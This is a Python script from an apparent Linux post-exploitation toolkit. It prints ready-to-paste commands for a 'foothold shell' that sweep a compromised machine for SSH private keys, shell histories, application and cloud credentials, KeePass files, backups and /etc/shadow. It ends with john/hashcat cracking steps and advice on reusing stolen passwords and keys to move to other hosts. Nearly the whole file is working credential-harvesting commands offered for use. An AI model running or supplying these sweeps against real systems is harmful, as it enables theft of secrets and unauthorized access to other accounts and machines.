#!/usr/bin/env python3
"""CREDENTIAL / LOOT HARVESTING (Linux) — the missing half of the funnel.

enum.sh flags a few cred spots; this is the thorough sweep. A reused password or an SSH key is
often the real privesc/lateral path. Everything runs with coreutils already on the box (find /
grep / cat) — nothing to install on the target. Cracking runs on YOUR attacker box (john/hashcat).

PRINTS commands you paste into your foothold shell. Edit LHOST/LPORT in _linpriv_common.py.

Usage:
  python3 gen_loot.py [--mode all|keys|history|config|backups|shadow]
"""
import sys
import _linpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

mode = opt("--mode", "all")

def keys():
    print("# --- SSH keys (a readable id_* on ANY user = ssh to that user; check agents/known_hosts for targets) ---")
    print("find / \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' -o -name 'authorized_keys' \\) -readable 2>/dev/null")
    print("find / -name known_hosts 2>/dev/null | xargs -r grep -H . 2>/dev/null | head   # where this box connects out")
    print()

def history():
    print("# --- shell / app history (passwords typed on a command line) ---")
    print("cat ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history ~/.python_history 2>/dev/null | grep -iE 'passw|-p |secret|token|key|mysql|ssh|curl|wget' ")
    print("find /home /root -name '.*_history' -readable 2>/dev/null | xargs -r tail -n +1 2>/dev/null | head -60")
    print()

def config():
    print("# --- app/config files with embedded creds ---")
    print("find / \\( -name '.env' -o -name 'wp-config.php' -o -name 'settings.py' -o -name 'database.yml' "
          "-o -name '.pgpass' -o -name '.netrc' -o -name '.git-credentials' -o -name 'config.php' \\) -readable 2>/dev/null "
          "| xargs -r grep -HiE 'pass|secret|key|token|user' 2>/dev/null | head -40")
    print("# broad grep across the usual web/app roots:")
    print("grep -rIiE 'password|passwd|secret|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE' /var/www /opt /srv /etc /home 2>/dev/null | grep -vE '\\.(png|jpg|gz|min\\.js)' | head -40")
    print("# cloud / container creds:")
    print("cat ~/.aws/credentials ~/.docker/config.json ~/.kube/config 2>/dev/null; find / -name '*.kdbx' -readable 2>/dev/null   # KeePass")
    print()

def backups():
    print("# --- world-readable backups (often a copy of /etc/shadow, a DB dump, or a config with creds) ---")
    print("ls -la /var/backups/ 2>/dev/null; find / \\( -name '*.bak' -o -name '*.old' -o -name '*~' -o -name '*.sql' -o -name 'shadow*' \\) -readable 2>/dev/null | grep -vE '/proc/|/sys/' | head -40")
    print("cat /var/backups/shadow* /var/backups/passwd* 2>/dev/null   # a readable shadow backup = crack it offline")
    print()

def shadow():
    print("# --- is /etc/shadow itself readable (misconfig or a cap_dac_read_search primitive)? ---")
    print("ls -l /etc/shadow; cat /etc/shadow 2>/dev/null | grep -vE ':[*!]:' | head   # only lines with a real hash")
    print("# if readable, unshadow + crack on the ATTACKER (you'll have john/hashcat):")
    print("#   (attacker) unshadow passwd.txt shadow.txt > u.txt ; john --wordlist=rockyou.txt u.txt")
    print("#   or:        hashcat -m 1800 shadow-hash rockyou.txt        (-m 1800 = sha512crypt $6$)")
    print()

secs = {"keys": keys, "history": history, "config": config, "backups": backups, "shadow": shadow}
print("# LINUX LOOT SWEEP (read-only; coreutils only). A reused cred / SSH key is often the real path.\n")
if mode == "all":
    for f in (keys, history, config, backups, shadow): f()
    print("# --- WHAT TO DO WITH IT ---")
    print("#  reuse a password:   su <user>   |   ssh <user>@<host-from-known_hosts>   |   sudo -l  (as the new user)")
    print("#  private key found:  chmod 600 k; ssh -i k <user>@<target>")
    print("#  a hash to crack:    john / hashcat on the attacker (see --mode shadow). Try password reuse FIRST — it's free.")
elif mode in secs:
    secs[mode]()
else:
    print(f"mode must be one of: all, {', '.join(secs)}"); sys.exit(1)
